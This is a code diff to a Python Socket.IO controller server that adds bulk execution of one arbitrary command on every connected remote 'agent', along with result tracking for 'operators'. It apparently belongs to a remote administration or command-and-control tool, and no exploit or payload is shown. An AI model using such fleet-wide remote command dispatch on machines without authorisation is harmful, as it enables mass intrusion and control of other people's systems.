@@ -3651,6 +3651,96 @@ def handle_execute_command(data):
         print(f"🔍 Controller: Agent {agent_id} not found or disconnected. Available agents: {list(AGENTS_DATA.keys())}")
         emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)
 
+@socketio.on('execute_bulk_command')
+def handle_execute_bulk_command(data):
+    """Execute a command on all connected agents"""
+    try:
+        command = data.get('command')
+        
+        if not command:
+            emit('bulk_command_error', {'error': 'No command provided'}, room=request.sid)
+            return
+        
+        print(f"\n{'='*80}")
+        print(f"📢 BULK COMMAND EXECUTION REQUESTED")
+        print(f"{'='*80}")
+        print(f"Command: {command}")
+        print(f"Operator SID: {request.sid}")
+        
+        with AGENTS_DATA_LOCK:
+            agent_ids = list(AGENTS_DATA.keys())
+            agent_count = len(agent_ids)
+        
+        print(f"Target agents: {agent_count}")
+        print(f"Agent IDs: {agent_ids}")
+        
+        if agent_count == 0:
+            emit('bulk_command_error', {'error': 'No agents connected'}, room=request.sid)
+            emit_notification('warning', 'Bulk Command Failed', 'No agents available', 'command')
+            return
+        
+        # Generate unique execution ID for tracking
+        bulk_execution_id = f"bulk_{int(time.time())}_{secrets.token_hex(4)}"
+        
+        # Track results
+        bulk_results = {
+            'execution_id': bulk_execution_id,
+            'command': command,
+            'total': agent_count,
+            'completed': 0,
+            'successful': 0,
+            'failed': 0,
+            'results': {}
+        }
+        
+        # Store in temporary dict (you might want to use Redis or similar in production)
+        if not hasattr(socketio, 'bulk_executions'):
+            socketio.bulk_executions = {}
+        socketio.bulk_executions[bulk_execution_id] = bulk_results
+        
+        # Send command to each agent
+        for agent_id in agent_ids:
+            try:
+                with AGENTS_DATA_LOCK:
+                    if agent_id in AGENTS_DATA:
+                        agent_sid = AGENTS_DATA[agent_id]["sid"]
+                        agent_name = AGENTS_DATA[agent_id].get("hostname", agent_id)
+                
+                execution_id = f"{bulk_execution_id}_{agent_id}"
+                
+                print(f"  → Sending to {agent_name} ({agent_id})")
+                
+                # Send command to agent
+                emit('command', {
+                    'command': command,
+                    'execution_id': execution_id,
+                    'bulk_execution_id': bulk_execution_id
+                }, room=agent_sid)
+                
+            except Exception as e:
+                print(f"  ✗ Error sending to {agent_id}: {e}")
+                bulk_results['failed'] += 1
+                bulk_results['completed'] += 1
+                bulk_results['results'][agent_id] = {'success': False, 'error': str(e)}
+        
+        # Emit initial status
+        emit('bulk_command_started', {
+            'execution_id': bulk_execution_id,
+            'command': command,
+            'total_agents': agent_count
+        }, room=request.sid)
+        
+        emit_notification('info', 'Bulk Command Started', 
+                         f'Executing "{command}" on {agent_count} agent(s)', 'command')
+        
+        print(f"{'='*80}\n")
+        
+    except Exception as e:
+        print(f"❌ Error in bulk command execution: {e}")
+        import traceback
+        traceback.print_exc()
+        emit('bulk_command_error', {'error': str(e)}, room=request.sid)
+
 @socketio.on('process_list')
 def handle_process_list(data):
     """Agent sends structured process list; relay to operators."""
@@ -4613,14 +4703,77 @@ def handle_command_result(data):
     prompt = data.get('prompt', 'PS C:\\>')
     exit_code = data.get('exit_code', 0)
     
+    # Check if this is part of a bulk execution
+    bulk_execution_id = None
+    if execution_id and '_' in execution_id and execution_id.startswith('bulk_'):
+        # Extract bulk_execution_id from execution_id (format: bulk_timestamp_hex_agentid)
+        parts = execution_id.rsplit('_', 1)
+        if len(parts) == 2:
+            bulk_execution_id = parts[0]
+    
     print(f"🔍 Controller: Processing command result for agent {agent_id}")
     print(f"🔍 Controller: Command: {command}")
+    print(f"🔍 Controller: Bulk Execution ID: {bulk_execution_id}")
     print(f"🔍 Controller: Output length: {len(output)}")
     print(f"🔍 Controller: formatted_text length: {len(formatted_text)}")
     print(f"🔍 Controller: terminal_type: {terminal_type}")
     print(f"🔍 Controller: Agent exists in AGENTS_DATA: {agent_id in AGENTS_DATA}")
     
-    # ✅ Broadcast command result to operators (include ALL fields from agent)
+    # Check if this is part of a bulk execution
+    if bulk_execution_id and hasattr(socketio, 'bulk_executions'):
+        bulk_results = socketio.bulk_executions.get(bulk_execution_id)
+        if bulk_results:
+            # Update bulk results
+            bulk_results['completed'] += 1
+            if success:
+                bulk_results['successful'] += 1
+            else:
+                bulk_results['failed'] += 1
+            bulk_results['results'][agent_id] = {
+                'success': success,
+                'output': formatted_text or output
+            }
+            
+            print(f"📊 Bulk Progress: {bulk_results['completed']}/{bulk_results['total']}")
+            
+            # Send individual result to operators
+            emit('bulk_command_result', {
+                'agent_id': agent_id,
+                'output': formatted_text or output,
+                'success': success,
+                'execution_id': bulk_execution_id
+            }, room='operators')
+            
+            # Check if all agents have responded
+            if bulk_results['completed'] >= bulk_results['total']:
+                print(f"✅ Bulk execution complete!")
+                print(f"   Total: {bulk_results['total']}")
+                print(f"   Successful: {bulk_results['successful']}")
+                print(f"   Failed: {bulk_results['failed']}")
+                
+                # Send completion notification
+                emit('bulk_command_complete', {
+                    'execution_id': bulk_execution_id,
+                    'total': bulk_results['total'],
+                    'successful': bulk_results['successful'],
+                    'failed': bulk_results['failed'],
+                    'results': bulk_results['results']
+                }, room='operators')
+                
+                # Emit notification
+                emit_notification(
+                    'success' if bulk_results['failed'] == 0 else 'warning',
+                    'Bulk Command Complete',
+                    f"Command executed on {bulk_results['total']} agent(s). Success: {bulk_results['successful']}, Failed: {bulk_results['failed']}",
+                    'command'
+                )
+                
+                # Clean up
+                del socketio.bulk_executions[bulk_execution_id]
+            
+            return  # Don't emit regular command_result for bulk executions
+    
+    # ✅ Regular single command result - Broadcast command result to operators (include ALL fields from agent)
     result_data = {
         'agent_id': agent_id,
         'execution_id': execution_id,
